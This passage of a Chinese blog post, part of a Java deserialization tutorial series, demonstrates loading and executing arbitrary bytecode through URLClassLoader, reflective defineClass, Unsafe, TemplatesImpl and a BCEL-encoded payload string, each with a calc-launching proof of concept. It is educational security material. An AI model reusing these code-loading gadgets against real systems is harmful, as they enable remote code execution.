+<h4 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h4><p>在 <code>Calc.class</code> 文件目录下执行 <code>python3 -m http.server 9999</code>，起一个 http 服务。</p>
+<p><strong>HTTPRce.java</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HTTPRce</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">urlClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLClassLoader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://127.0.0.1:9999&quot;</span>)&#125;);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">calc</span> <span class="hljs-operator">=</span> urlClassLoader.loadClass(<span class="hljs-string">&quot;org.example.Calc&quot;</span>);<br>        calc.newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/9.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/10.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="file-jar协议"><a href="#file-jar协议" class="headerlink" title="file+jar协议"></a>file+jar协议</h4><p>要使用jar协议，对象当然需要是jar包，所以我们先去把class文件打包为jar文件。去到class文件的目录下执行命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">jar -cvf Calc.jar Clac.class<br></code></pre></td></tr></table></figure>
+
+<p><strong>FileJarRce.java</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileJarRce</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">urlClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLClassLoader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;jar:file:///E:\\java\\loader\\loader2\\target\\classes\\org\\example\\Calc.jar!/&quot;</span>)&#125;);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">calc</span> <span class="hljs-operator">=</span> urlClassLoader.loadClass(<span class="hljs-string">&quot;org.example.Calc&quot;</span>);<br>        calc.newInstance();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/11.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="HTTP-jar协议"><a href="#HTTP-jar协议" class="headerlink" title="HTTP+jar协议"></a>HTTP+jar协议</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HTTPJarRce</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">urlClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLClassLoader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;jar:file:///E:\\Calc.jar!/&quot;</span>)&#125;);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">calc</span> <span class="hljs-operator">=</span> urlClassLoader.loadClass(<span class="hljs-string">&quot;org.example.Calc&quot;</span>);<br>        calc.newInstance();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/12.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="利用-ClassLoader-defineClass-加载字节码"><a href="#利用-ClassLoader-defineClass-加载字节码" class="headerlink" title="利用 ClassLoader#defineClass 加载字节码"></a>利用 ClassLoader#defineClass 加载字节码</h3><p>不管是加载远程 class 文件，还是本地的 class 或 jar 文件，Java 都经历的是下面这三个方法调用。</p>
+<p><img src="/13.png" srcset="/img/loading.gif" lazyload></p>
+<p>前面我们的学习中或多或少都有提及上面的方法</p>
+<ul>
+<li><p><code>loadClass</code>是 ClassLoader 里核心入口方法，双亲委派逻辑写在这个方法里面。如果父加载器全都找不到，则调用<code>findClass()</code>，由当前类加载器自己去找字节码</p>
+</li>
+<li><p><code>findClass</code>只负责根据类全限定名，找到.class 字节数组 byte []**，**不负责双亲委派，不负责把字节交给 JVM 生成 Class。 找到字节之后，在 <code>findClass</code>内部调用<code>defineClass</code>。</p>
+</li>
+<li><p><code>defineClass</code>负责接收 class 字节数组<code>byte[]</code>，校验字节码合法性，把字节码转换成 JVM 里面的 Class 对象。</p>
+</li>
+</ul>
+<p>所以可见，真正的核心是<code>defineClass</code>，因为他的作用是将字节码转变一个Java类。</p>
+<p>最终实现转变的<code>ClassLoader#defineClass</code>是<code>native</code>方法，具体实现在JVM由C语言实现，我们在一般反射调用的<code>defineClass</code>方法是下图这个</p>
+<p><img src="/14.png" srcset="/img/loading.gif" lazyload></p>
+<p>解释一下 <code>defineClass</code></p>
+<p><code>name</code>为类名，<code>b</code>为字节码数组，<code>off</code>为偏移量，<code>len</code>为字节码数组的长度。</p>
+<p>由于这里是<code>protect</code>，我们无法直接调用。只能通过反射调用进行字节码加载。</p>
+<p><strong>DefineClassRce.java</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DefineClassRce</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> ClassLoader.getSystemClassLoader();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class);<br>        method.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E:\\java\\loader\\loader\\target\\classes\\org\\example\\Calc.class&quot;</span>)); <span class="hljs-comment">// 字节码的数组</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> (Class) method.invoke(classLoader, <span class="hljs-string">&quot;org.example.Calc&quot;</span>, code, <span class="hljs-number">0</span>, code.length);<br>        c.newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/15.png" srcset="/img/loading.gif" lazyload></p>
+<p>使用<code>ClassLoader#defineClass</code>直接加载字节码的有点是不需要出网就可以加载字节码，甚至我们可以不用从硬盘中读取<code>class</code>文件，只要有字节码数组即可。但缺点就是我们需要设置<code>m.setAccessible(true)</code>才可以利用，这让我们在简单反射中无法使用，到了JDK9以上更是由于模块化的加入，我们无法再通过设置<code>m.setAccessible(true)</code>去利用Java自带的包中的<code>非public</code></p>
+<h3 id="利用Unsafe-加载字节码"><a href="#利用Unsafe-加载字节码" class="headerlink" title="利用Unsafe 加载字节码"></a>利用Unsafe 加载字节码</h3><p>在<code>Unsafe</code>中也存在<code>defineClass</code>方法，这里的还是一个<code>native</code>方法</p>
+<p><img src="/16.png" srcset="/img/loading.gif" lazyload></p>
+<p>虽然这里是<code>public</code>方法，但由于<code>Unsafe</code>和<code>Runtime</code>一样都是单例模式，全局只有唯一一个实例对象，所以我们也没法直接调用这个方法，但不用担心，我们还有反射。</p>
+<p><strong>UnsafeClassLoaderRce.java</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> sun.misc.Unsafe;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UnsafeClassLoaderRce</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> ClassLoader.getSystemClassLoader();<br>        Class&lt;Unsafe&gt; unsafeClass = Unsafe.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">unsafeField</span> <span class="hljs-operator">=</span> unsafeClass.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>        unsafeField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Unsafe</span> <span class="hljs-variable">classUnsafe</span> <span class="hljs-operator">=</span> (Unsafe) unsafeField.get(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">defineClassMethod</span> <span class="hljs-operator">=</span> unsafeClass.getMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.class, <span class="hljs-type">byte</span>[].class,<br>                <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class, ClassLoader.class, ProtectionDomain.class);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E:\\java\\loader\\loader\\target\\classes\\org\\example\\Calc.class&quot;</span>));<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">calc</span> <span class="hljs-operator">=</span> (Class) defineClassMethod.invoke(classUnsafe, <span class="hljs-string">&quot;org.example.Calc&quot;</span>, code, <span class="hljs-number">0</span>, code.length, classLoader, <span class="hljs-literal">null</span>);<br>        calc.newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/17.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="利用TemplatesImpl-加载字节码"><a href="#利用TemplatesImpl-加载字节码" class="headerlink" title="利用TemplatesImpl 加载字节码"></a>利用TemplatesImpl 加载字节码</h3><p>在 <code>TemplatesImpl</code> 类中还有一个内部类 <code>TransletClassLoader</code>，这个类是继承 <code>ClassLoader</code>，并且重写了 <code>defineClass</code> 方法。这个方法内部调用了<code>ClassLoader#defineClass</code></p>
+<p><img src="/18.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里<code>TransletClassLoader#defineClass</code>是一个<code>default</code>类型的方法，这样同包的<code>TemplatesImpl</code>就可以利用了</p>
+<p>下面是 <code>TransletClassLoader#defineClass()</code> 的调用链，感兴趣的师傅也可以自己尝试寻找一下</p>
+<p><img src="/19.png" srcset="/img/loading.gif" lazyload></p>
+<p>追到最前面两个方法 <code>TemplatesImpl#getOutputProperties()</code> 和 <code>TemplatesImpl#newTransformer()</code> ，这两者的作用域是public，可以被外部调用。</p>
+<p>我们尝试用 <code>TemplatesImpl#newTransformer()</code> 构造一个简单的 POC</p>
+<p>但这里有一点需要注意：我们转为字节码的类必须继承<code>AbstractTranslet</code>，同时还得重写两个方法</p>
+<p><strong>Calc.java</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calc</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>        <br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>        <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>在写POC前，我们先去看一下源码</p>
+<p><img src="/20.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="D:\Typora\web-图片\java反序列化-类加载机制\21.png" srcset="/img/loading.gif" lazyload></p>
+<p>从上面的图片我们也可以看出，我们需要满足以下条件，我们才能正常调用链子</p>
+<ul>
+<li><code>_name</code>不可为空</li>
+<li><code>_bytecodes</code>传入字节码</li>
+<li><code>_factory</code>赋值<code>TransformerFactoryImpl</code>对象</li>
+</ul>
+<p>我们根据这个思路去编写</p>
+<p><strong>TemplatesRce.java</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  <br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  <br>  <br><span class="hljs-keyword">import</span> java.lang.reflect.Field;  <br><span class="hljs-keyword">import</span> java.nio.file.Files;  <br><span class="hljs-keyword">import</span> java.nio.file.Paths;  <br>  <br><span class="hljs-comment">// 主程序  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TemplatesRce</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E:\java\loader\loader\target\classes\org\example\Calc.class&quot;</span>));  <br> <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();  <br> setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;Calc&quot;</span>);  <br> setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);  <br> setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());  <br> templates.newTransformer();  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);  <br> field.setAccessible(<span class="hljs-literal">true</span>);  <br> field.set(obj, value);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/22.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="利用-BCEL-ClassLoader-加载字节码"><a href="#利用-BCEL-ClassLoader-加载字节码" class="headerlink" title="利用 BCEL ClassLoader 加载字节码"></a>利用 BCEL ClassLoader 加载字节码</h3><ul>
+<li>什么是 BCEL？</li>
+</ul>
+<p>BCEL全称为Byte Code Engineering Library，它是一个pache Commons 字节码工程库，是老牌 Java 字节码处理工具库，用来读取、解析、修改、在内存动态生成 Java .class 字节码</p>
+<p>我们可以通过 BCEL 提供的两个类 <code>Repository</code> 和 <code>Utility</code> 来利用： <code>Repository</code> 是BCEL 里用来缓存、查找已经解析好的<code>JavaClass</code>对象； <code>Utility</code> 用于将原生的字节码转换成对象</p>
+<p>这里由于原生的JDK包中可能在下载的时候没有将<code>Utility</code>类带入，使用代码的时候会找不到，这边建议引入Apache Commons BCEL 库</p>
+<p><strong>pom.xml</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.bcel<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>bcel<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>6.10.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>Calc.java</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;  <br>   <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calc</span> &#123;  <br>    <span class="hljs-keyword">static</span> &#123;  <br>        <span class="hljs-keyword">try</span> &#123;  <br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);  <br> &#125; <span class="hljs-keyword">catch</span> (IOException e)&#123;  <br>            e.printStackTrace();  <br> &#125;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><strong>BCELRce.java</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.Repository;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;<br><br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BCELRce</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Class&lt;?&gt; calc = Class.forName(<span class="hljs-string">&quot;org.example.Calc&quot;</span>);<br>        <span class="hljs-type">JavaClass</span> <span class="hljs-variable">javaClass</span> <span class="hljs-operator">=</span> Repository.lookupClass(calc);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">bcelPayloadStr</span> <span class="hljs-operator">=</span> Utility.encode(javaClass.getBytes(),<span class="hljs-literal">true</span>);<br>        System.out.println(bcelPayloadStr);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/23.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们可以看到下面有一长串字符，这一堆看起来像乱码的字符其实是BCEL ClassLoader 正是用于加载这串特殊的“字节码”，并可以执行其中的代码。我们来写个POC尝试执行一下</p>
+<p><strong>BCELSuccessRce.java</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BCELSuccessRce</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassLoader</span>().loadClass(<span class="hljs-string">&quot;$$BCEL$$&quot;</span> + <span class="hljs-string">&quot;$l$8b$I$A$A$A$A$A$A$AmQMO$db$40$Q$7d$9b8$b1c$9c$86$EB$v$f4$83$b6$b4$N9$e0$L$b7D$5c$QHU$N$a9$9a$88$9e7$cb$w$dd$e0$d8$91$b3$a9$f2$8f8$e7$C$88$D$3f$80$l$85$98$dd$a6$U$b5$b5$e4$f9x3$ef$cd$8c$7dw$7fs$L$60$P$l$7dxx$eec$j$_$3cl$Y$bf$e9$e2$a5$8f$C$5e$b9x$ed$e2$NC$b1$ad$S$a5$f7$Z$f2$8d$9dS$G$e7$m$3d$93$M$95H$r$f2d$3a$ea$cb$ac$c7$fb1$n$b5$u$V$3c$3e$e5$992$f9$Ct$f4$P5$b1$b5l$Q$ca$Z$l$8dc$Z$k$f0X$b4$Y$bc$b6$88$X$d2$8cZ$eb$d1$90$ff$e4$a1J$c3$cf$9d$c3$99$90c$ad$d2$84$da$ca$5d$cd$c5$f91$l$5bI$da$8e$c1$ef$a6$d3L$c8$peF$94$8c$dc$ae$e1$G$u$c1w$b1$V$e0$z$de$d1lZG$Ex$8fm$86$95$ffh$H$f8$A$9fa$f9$ef$d5$I$b2$dd1O$Ga$a7$3f$94B3T$ff$40$df$a6$89V$p$9a$ec$P$a4$7eL$ea$8d$9d$e8$9f$kZ$df$913I$92$9f$gO$aa$5d$9d$a9d$d0zJ$f8$9a$a5BN$sD$a8$8c$a9$a8$ed$d1$bd$8c$LI$c7$b8$f4$93$cc$93$D3$t$92$5d$a2$y$q$cf$c8$X$9aW$60s$5b$O$c8$W$7f$81$u$93$N$W$f13T$c8$7bX$7e$qs$x$G$d4$ae$91$ab$e5$_$e1$7c$bf$80$f7$a5y$89$e2$dc$e2$r$e2$W$90$b7$8ak$U$Zv$89$98$e6$h$97I$a5J$d1$ef$Je8$94$d7$u$5b$a1$d7E$$r$b1$eaP$a1n$97Z$7b$A$9daTTn$C$A$A&quot;</span>).newInstance();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p><img src="/24.png" srcset="/img/loading.gif" lazyload></p>
+<p>那么为什么要在前面加上 <code>$$BCEL$$</code> 呢？这里引用一下p神的解释</p>
+<blockquote>
+<p>BCEL 这个包中有个有趣的类<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>，他是一个 ClassLoader，但是他重写了 Java 内置的<code>ClassLoader#loadClass()</code>方法。</p>
+<p>在 <code>ClassLoader#loadClass()</code> 中，其会判断类名是否是 <code>$$BCEL$$</code> 开头，如果是的话，将会对这个字符串进行 decode</p>
+</blockquote>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/java/" class="category-chain-item">java</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="print-no-link">#java反序列化</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>java反序列化入门篇-04-类加载机制</div>
+      <div>http://blog.yunli1.com/2026/09/28/java反序列化基础篇-04-类加载机制/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>yunli</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年9月28日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
